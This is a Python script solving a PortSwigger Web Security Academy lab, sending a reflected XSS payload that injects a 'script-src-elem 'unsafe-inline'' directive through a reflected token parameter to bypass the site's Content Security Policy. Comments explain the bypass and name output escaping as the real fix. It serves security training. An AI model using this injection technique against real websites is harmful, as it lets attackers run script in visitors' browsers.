# https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac1d1f0c1e188c8d80d64da10059006a.web-security-academy.net"
url = scheme + host
# payload = "<img src=1 onerror=alert(1)>"
payload = "<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'"
params = {"search": payload}

requests.get(url, verify=verify, proxies=proxies, params=params)

# This challenge can only be completed inside google chrome by going to this web url:
# https://ac1d1f0c1e188c8d80d64da10059006a.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

# I only went through this challenge so i could see what the CSP header looked like for a mostly secure application:
# default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=

# This exploit works by using the script-src-elem directive to overwrite the script-src directive that was specified by the header. Note that correct use of escaping the data before it enters the parser context will fix this problem. CSP is just a secondary protection. The primary protection should be escaping output.